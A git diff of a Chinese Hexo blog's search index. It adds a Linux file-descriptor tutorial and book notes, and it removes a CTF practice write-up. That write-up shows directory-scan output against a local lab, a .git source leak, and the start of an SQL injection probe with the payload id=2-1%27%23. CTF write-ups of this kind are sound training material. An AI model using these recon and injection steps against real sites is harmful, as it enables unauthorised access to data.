+    <url>/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/</url>
+    <content><![CDATA[<p>Linux 下的文件描述符</p>
+<span id="more"></span>
+
+<h2 id="1-从一个最常见的例子说起"><a href="#1-从一个最常见的例子说起" class="headerlink" title="1. 从一个最常见的例子说起"></a>1. 从一个最常见的例子说起</h2><p>在使用Linux的过程中， 我们平时经常看到下面这样的用法：</p>
+<blockquote>
+<p>echo log &gt; /dev/null 2&gt;&amp;1</p>
+</blockquote>
+<ul>
+<li><blockquote>
+<p>  ：表示将输出结果重定向到哪里，例如：echo “123” &gt; /home/123.txt</p>
+</blockquote>
+</li>
+<li>/dev/null ：表示空设备文件<br>所以 echo log &gt; /dev/null 表示把日志输出到空文件设备，也就是将打印信息丢弃掉，屏幕上什么也不显示。</li>
+<li>1  ：表示stdout标准输出</li>
+<li>2  ：表示stderr标准错误</li>
+<li>&amp;  ：表示等同于的意思</li>
+</ul>
+<p>所以  2&gt;&amp;1 表示2的输出重定向等同于1，也就是标准错误输出重定向到标准输出。因为前面标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
+<p>这个用法平时很常见，重点是为什么这里是用 2 和 1 ，不是3456什么的呢？这要从 Linux 中的文件描述符说起。</p>
+<h2 id="2-Linux中的文件描述符（file-descriptor）"><a href="#2-Linux中的文件描述符（file-descriptor）" class="headerlink" title="2. Linux中的文件描述符（file descriptor）"></a>2. Linux中的文件描述符（file descriptor）</h2><p>我们知道在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。</p>
+<p>文件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4……</p>
+<p>Linux内核对所有打开的文件有一个文件描述符表格，里面存储了每个文件描述符作为索引与一个打开文件相对应的关系，简单理解就是下图这样一个数组，文件描述符（索引）就是文件描述符表这个数组的下标，数组的内容就是指向一个个打开的文件的指针。</p>
+<p><img src="file_descriptor.png" alt="file descriptor"></p>
+<p><strong>上面只是简单理解，实际上关于文件描述符，Linux内核维护了3个数据结构：</strong></p>
+<ul>
+<li>进程级的文件描述符表</li>
+<li>系统级的打开文件描述符表</li>
+<li>文件系统的i-node表</li>
+</ul>
+<p>一个 Linux 进程启动后，会在内核空间中创建一个 PCB(Process Control Block) 控制块，PCB 内部有一个文件描述符表（File descriptor table），记录着当前进程所有可用的文件描述符，也即当前进程所有打开的文件。进程级的描述符表的每一条记录了单个进程所使用的文件描述符的相关信息，进程之间相互独立，一个进程使用了文件描述符3，另一个进程也可以用3。除了进程级的文件描述符表，系统还需要维护另外两张表：打开文件表、i-node 表。这两张表存储了每个打开文件的打开文件句柄（open file handle）。一个打开文件句柄存储了与一个打开文件相关的全部信息。</p>
+<p><strong>系统级的打开文件描述符表：</strong></p>
+<ul>
+<li>当前文件偏移量（调用read()和write()时更新，或使用lseek()直接修改）</li>
+<li>打开文件时的标识（open()的flags参数）</li>
+<li>文件访问模式（如调用open()时所设置的只读模式、只写模式或读写模式）</li>
+<li>与信号驱动相关的设置</li>
+<li>对该文件i-node对象的引用，即i-node 表指针</li>
+</ul>
+<p><strong>文件系统的i-node表：</strong></p>
+<ul>
+<li><p>文件类型（例如：常规文件、套接字或FIFO）和访问权限</p>
+</li>
+<li><p>一个指针，指向该文件所持有的锁列表</p>
+</li>
+<li><p>文件的各种属性，包括文件大小以及与不同类型操作相关的时间戳</p>
+</li>
+<li><p>文件描述符、打开的文件句柄以及i-node之间的关系如下图：<br><img src="relationship.png" alt="relationship"></p>
+</li>
+<li><p>在进程 A 中，文件描述符 1 和 20 都指向了同一个打开文件表项，标号为 23（指向了打开文件表中下标为 23 的数组元素），这可能是通过调用 dup()、dup2()、fcntl() 或者对同一个文件多次调用了 open() 函数形成的。</p>
+</li>
+<li><p>进程 A 的文件描述符 2 和进程 B 的文件描述符 2 都指向了同一个文件，这可能是在调用 fork() 后出现的（即进程 A、B 是父子进程关系），或者是不同的进程独自去调用 open() 函数打开了同一个文件，此时进程内部的描述符正好分配到与其他进程打开该文件的描述符一样。</p>
+</li>
+<li><p>进程 A 的描述符 0 和进程 B 的描述符 3 分别指向不同的打开文件表项，但这些表项均指向 i-node 表的同一个条目（标号为 1976）；换言之，它们指向了同一个文件。发生这种情况是因为每个进程各自对同一个文件发起了 open() 调用。同一个进程两次打开同一个文件，也会发生类似情况。 </p>
+</li>
+</ul>
+<p><strong>这就说明：同一个进程的不同文件描述符可以指向同一个文件；不同进程可以拥有相同的文件描述符；不同进程的同一个文件描述符可以指向不同的文件（一般也是这样，除了 0、1、2 这三个特殊的文件）；不同进程的不同文件描述符也可以指向同一个文件。</strong></p>
+<h2 id="3-Linux上打开文件举例"><a href="#3-Linux上打开文件举例" class="headerlink" title="3. Linux上打开文件举例"></a>3. Linux上打开文件举例</h2><p>比如在Linux上用 vim test.py 打开一个文件，保持打开状态，再新打开一个新的shell，输入命令pidof vim 获取vim进程的pid号，然后 ll  /proc/$pid/fd 查看vim 进程所使用的文件描述符列表。<br><img src="example_vim.png" alt="example vim"></p>
+<p>/dev/pts是远程登陆(telnet,ssh等)后创建的控制台设备文件所在的目录。因为我是通过Xshell远程登录的，所以标准输入0，标准输出1，标准错误2的文件描述符都指向虚拟终端控制台 /dev/pts/6 。再看下面是新打开的 test.py 的文件描述符，竟然是4，说好的从3开始呢？</p>
+<p>这个我也困扰了好久，查了各种资料，终于在一个大佬的帮助下在一个论坛找到原因，有时候中文查不到还是要试试英文搜索啊。因为vim这种编辑器的原理是先打开源文件并拷贝，然后关闭源文件再打开自己的副本，修改完文件保存的时候直接将副本重命名覆盖源文件。所以打开源文件的时候用的文件描述符3，然后打开自己的副本是时候就该用文件描述符4了，然后关闭源文件，文件描述符3就被释放了，我们查看的时候就只剩下了4，这里它指向的是vim创建的副本文件。这里只是说个大概意思，具体深究要去深入了解一下<a href="https://blog.csdn.net/weixin_43535689/article/details/104750148">vim的实现原理——奥尔特星云大使</a>，下面是当时我看到的论坛上的资料截图，链接在这：<a href="https://stackoverflow.com/questions/48588284/lsof-command-can-not-return-files-being-opened-by-kwrite">StackOverFlow</a>。<br><img src="stackoverflow_vim.png" alt="stackoverflow vim"></p>
+<h2 id="4-C语言中文件描述符的使用"><a href="#4-C语言中文件描述符的使用" class="headerlink" title="4. C语言中文件描述符的使用"></a>4. C语言中文件描述符的使用</h2><p>C语言中可以通过 open 函数返回一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test.c 文件，输入下面代码保存。 编译后执行，发现新打开文件的文件描述符是3。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;test.py&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test.py fd = %d \n&quot;</span>, fd);  <span class="comment">// test.py fd = 3</span></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-Python中文件描述符的使用"><a href="#5-Python中文件描述符的使用" class="headerlink" title="5. Python中文件描述符的使用"></a>5. Python中文件描述符的使用</h2><p>Python中通过 sys 模块封装了标准输入、标准输出和错误输出。通过我们平时常用的内建函数 open 可以获取一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test2.py 文件，输入下面代码保存。 执行，发现新打开文件的文件描述符是3。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdin fd = &#x27;</span>, sys.stdin.fileno())  // stdin fd = <span class="number">0</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdout fd = &#x27;</span>, sys.stdout.fileno())  // stdout fd = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stderr fd = &#x27;</span>, sys.stderr.fileno())  // stderr fd = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.py&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test.py fd = &#x27;</span>, f.fileno())  // test.py fd = <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Linux配置系统最大打开文件描述符个数"><a href="#6-Linux配置系统最大打开文件描述符个数" class="headerlink" title="6. Linux配置系统最大打开文件描述符个数"></a>6. Linux配置系统最大打开文件描述符个数</h2><h3 id="系统级限制"><a href="#系统级限制" class="headerlink" title="系统级限制"></a>系统级限制</h3><p>理论上系统内存有多少就可以打开多少的文件描述符，但是在实际中内核是会做相应的处理，一般最大打开文件数会是系统内存的10%（以KB来计算），称之为系统级限制。这个数字可以通过 cat /proc/sys/fs/file-max 或者 sysctl -a | grep fs.file-max 命令查看。</p>
+<p>更改系统级限制有临时更改和永久更改两种方式：</p>
+<ul>
+<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 sysctl -w fs.file-max=xxxx，其中xxxx就是要设置的数字。</li>
+<li>永久更改：vim编辑 /etc/sysctl.conf 文件，在后面添加 fs.file-max=xxxx，其中xxxx就是要设置的数字。保存退出后还要使用sysctl -p 命令使其生效。</li>
+</ul>
+<h3 id="用户级限制"><a href="#用户级限制" class="headerlink" title="用户级限制"></a>用户级限制</h3><p>同时为了控制每个进程消耗的文件资源，内核也会对单个进程最大打开文件数做默认限制，即用户级限制。32位系统默认值一般是1024，64位系统默认值一般是65535，可以使用 ulimit -n 命令查看。</p>
+<p>更改用户级限制也有临时更改和永久更改两种方式：</p>
+<ul>
+<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 ulimit -SHn xxxx 命令来修改，其中xxxx就是要设置的数字。</li>
+<li>永久更改：vim编辑 /etc/security/limits.conf 文件，修改其中的 hard nofile xxxx 和 soft nofile xxxx，其中xxxx就是要设置的数字。保存后退出。关于hard和soft的区别，参照下面参考链接中的第5个。</li>
+</ul>
+<h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7. 参考链接"></a>7. 参考链接</h2><ol>
+<li><a href="https://blog.csdn.net/cywosp/article/details/38965239">每天进步一点点——Linux中的文件描述符与打开文件之间的关系——cywosp</a></li>
+<li><a href="http://c.biancheng.net/view/3066.html">Linux文件描述符到底是什么？——C语言中文网</a></li>
+<li><a href="https://www.jianshu.com/p/0ff9ff1d108e">句柄和文件描述符（FD）——阳光丶不锈</a></li>
+<li><a href="https://juejin.cn/post/6844903962043236365#heading-0">带你破案：文件描述符到底是什么？——vran</a></li>
+<li><a href="http://www.ideabuffer.cn/2016/11/20/Linux%E9%85%8D%E7%BD%AE%E8%B0%83%E4%BC%98%EF%BC%9A%E6%9C%80%E5%A4%A7%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%AA%E6%95%B0/">Linux配置调优：最大打开文件描述符个数——Idea Buffer</a></li>
+<li><a href="%E4%BF%AE%E6%94%B9Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84%E6%9C%80%E5%A4%A7%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%99%90%E5%88%B6">修改Linux系统下的最大文件描述符限制——BlueguyChui</a></li>
+</ol>
+<p>————————————————<br>版权声明：本文为CSDN博主「杰克小麻雀」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/yushuaigee/article/details/107883964">https://blog.csdn.net/yushuaigee/article/details/107883964</a></p>
+]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何使用 Github + Hexo 搭建博客</title>
     <url>/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Github%20+%20Hexo%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Github%20+%20Hexo%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<blockquote>
@@ -942,7 +915,7 @@
 <p>Title 随便取个名字，粘贴复制的 id_rsa.pub 内容到 Key 中，点击 Add SSH key 完成添加。</p>
 <p><strong>验证连接</strong>：</p>
 <blockquote>
-<p>打开 Git Bash，输入 ssh -T <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#x6d;</a> 出现 “Are you sure……”，输入 yes 回车确认</p>
+<p>打开 Git Bash，输入 ssh -T <a href="mailto:&#103;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#99;&#x6f;&#x6d;">&#103;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#99;&#x6f;&#x6d;</a> 出现 “Are you sure……”，输入 yes 回车确认</p>
 </blockquote>
 <blockquote>
 <p>显示 “Hi xxx! You’ve successfully……” 即连接成功。</p>
@@ -1043,6 +1016,33 @@
       <tags>
         <tag>Hexo 博客</tag>
         <tag>搭建环境</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>读书笔记——《具体生活》</title>
+    <url>/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E3%80%8A%E5%85%B7%E4%BD%93%E7%94%9F%E6%B4%BB%E3%80%8B/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E3%80%8A%E5%85%B7%E4%BD%93%E7%94%9F%E6%B4%BB%E3%80%8B/</url>
+    <content><![CDATA[<p>  焦虑是现代人的常态。时间不够用，钱不够花，职业发展不够快，对当下和未来不够了解…我们不断加快生活的节奏，但快节奏之后是否带来了好处，我们并不清楚，只是觉得“快”比“慢”要好。</p>
+<p>  很多时候，我们做不好事情，是我们太匆忙、太着急，其实只要慢三拍，我们的事情会比以前做得好很多。有时候，慢比快好。</p>
+<p>  当忙碌成为生活的主旋律时，我们是否可以思考一下：生活的目的是什么？从容做事，优雅生活，这是我们生活的目的。很多人羡慕所谓的贵族生活，其实过去贵族的物质生活并不比今天的中产阶级好多少，但是他们整体的生活质量远非今天一般意义上的富有家庭所能比的。究其原因，是因为今天的人缺少了那份应有的从容和优雅。</p>
+<p>  当我们做事情的时候能够慢一点，少走点弯路，多花点实践享受浪漫而美好的人生，畅游人类知识和艺术的海洋，我们会发现自己是在真正地生活，而不是只是为了工作而活着。</p>
+<span id="more"></span>
+
+<h2 id="1-旅行的意义"><a href="#1-旅行的意义" class="headerlink" title="1. 旅行的意义"></a>1. 旅行的意义</h2><h2 id="2-博物馆之美"><a href="#2-博物馆之美" class="headerlink" title="2. 博物馆之美"></a>2. 博物馆之美</h2><h2 id="3-读书以以怡情长智"><a href="#3-读书以以怡情长智" class="headerlink" title="3. 读书以以怡情长智"></a>3. 读书以以怡情长智</h2><p>  古人把读万卷书和行万里路看作精英阶层成长不可或缺的两个环节，它们既能使人获得知识，也能令人愉悦自我。</p>
+<h3 id="3-1-阅读的意义"><a href="#3-1-阅读的意义" class="headerlink" title="3.1 阅读的意义"></a>3.1 阅读的意义</h3><ol>
+<li>阅读是放下可以让我们审视人生的不多的方式之一。<br>苏格拉底曾经说过，未经审视的人生不值得度过。而绅士人生需要有闲暇。读书必须有比较长的一段时间，不做其他事情，专心致志地阅读。</li>
+<li>阅读是一种交友方式，借书可以令两人的关系有所增进。<br>借书，说明至少两个人有共同的语言，在此基础上，谈合作也好，谈利益也罢，才搭得上话。对于男女之间交往来说，借一次书，还一次，至少就接触了两次，并且这也能创造一个良好的交谈话题。</li>
+<li>阅读不仅仅是为了让我们在冷酷无情的科技时代获得喘息，让我们重启大脑深入思考的功能，也是抵抗狭隘、思想控制和舆论支配的方式。<blockquote>
+<p>常常在焦虑的时候，或者感到特别难的时候，会去看看曾经觉得深有启发的书，让自己慢慢静下来，焦虑慢慢会平息，困难也会渐渐淡化，恢复状态，继续前行。现在发现，将书中的内容，与自己思想相结合，写出来的时候，特别的舒畅。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="4-音乐的故事"><a href="#4-音乐的故事" class="headerlink" title="4. 音乐的故事"></a>4. 音乐的故事</h2><h2 id="5-徕卡摄影的魅力"><a href="#5-徕卡摄影的魅力" class="headerlink" title="5. 徕卡摄影的魅力"></a>5. 徕卡摄影的魅力</h2><h2 id="6-香醇美酒"><a href="#6-香醇美酒" class="headerlink" title="6. 香醇美酒"></a>6. 香醇美酒</h2><h2 id="7-奢侈品的光泽"><a href="#7-奢侈品的光泽" class="headerlink" title="7. 奢侈品的光泽"></a>7. 奢侈品的光泽</h2>]]></content>
+      <categories>
+        <category>怡情长智</category>
+        <category>阅读</category>
+      </categories>
+      <tags>
+        <tag>读书/生活</tag>
       </tags>
   </entry>
   <entry>
@@ -1430,209 +1430,6 @@ Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱�
       </tags>
   </entry>
   <entry>
-    <title>《从0到1：CTFer成长之路》配套题目</title>
-    <url>/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/</url>
-    <content><![CDATA[<p>官方平台网址：<a href="https://book.nu1l.com/tasks/">https://book.nu1l.com/tasks/</a></p>
-<span id="more"></span>
-
-<h1 id="第一章-Web-入门"><a href="#第一章-Web-入门" class="headerlink" title="第一章 Web 入门"></a>第一章 Web 入门</h1><h2 id="1-1-信息搜集"><a href="#1-1-信息搜集" class="headerlink" title="1.1 信息搜集"></a>1.1 信息搜集</h2><h3 id="1-1-1-常见的搜集"><a href="#1-1-1-常见的搜集" class="headerlink" title="1.1.1 常见的搜集"></a>1.1.1 常见的搜集</h3><ol>
-<li>先使用目录扫描工具 <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> 扫描<code>127.0.0.1</code>网站，获得网站目录<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200    10KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.DS_Store</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200    12KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.index.php.swp</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php~</span><br><span class="line">200    47B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;robots.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br></pre></td></tr></table></figure></li>
-<li>发现存在可疑文件：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">robots.txt   # 常规文件</span><br><span class="line">index.php~   # gedit 备份文件</span><br><span class="line">.index.php.swp  # vim 备份文件</span><br></pre></td></tr></table></figure></li>
-<li>根据书中方法一一查验可得 flag</li>
-</ol>
-<h3 id="1-1-2-粗心的小李"><a href="#1-1-2-粗心的小李" class="headerlink" title="1.1.2 粗心的小李"></a>1.1.2 粗心的小李</h3><ol>
-<li><p>先使用 目录扫描工具 dirsearch 扫描 127.0.0.1 文件信息，获得下列文件目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200     5B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;COMMIT_EDITMSG</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;</span><br><span class="line">301   305B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;</span><br><span class="line">200    23B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;HEAD</span><br><span class="line">200    73B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;description</span><br><span class="line">200   137B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;config</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;hooks&#x2F;</span><br><span class="line">200   240B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;exclude</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;</span><br><span class="line">200   145B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;index</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;HEAD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;</span><br><span class="line">301   321B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;objects&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;</span><br><span class="line">200    41B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">301   316B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;tags    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;tags&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br></pre></td></tr></table></figure></li>
-<li><p>发现存在<code>.git</code>文件夹，试探访问<code>.git/config</code>，返回了下列内容，说明存在 git 泄露。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion &#x3D; 0</span><br><span class="line">	filemode &#x3D; true</span><br><span class="line">	bare &#x3D; false</span><br><span class="line">	logallrefupdates &#x3D; true</span><br><span class="line">	ignorecase &#x3D; true</span><br><span class="line">	precomposeunicode &#x3D; true</span><br></pre></td></tr></table></figure></li>
-<li><p>使用 <a href="https://github.com/denny0223/scrabble">scrabble</a> 工具，成功获到源码，拿到 flag。</p>
-</li>
-</ol>
-<h2 id="1-2-SQL注入"><a href="#1-2-SQL注入" class="headerlink" title="1.2 SQL注入"></a>1.2 SQL注入</h2><h3 id="1-2-1-SQL注入-1"><a href="#1-2-1-SQL注入-1" class="headerlink" title="1.2.1 SQL注入-1"></a>1.2.1 SQL注入-1</h3><ol>
-<li><p>127.0.0.1/index.php?id=2-1 的结果与 127.0.0.1/index.php?id=2 相同，说明不存在数字型注入。</p>
-</li>
-<li><p>尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。</p>
-</li>
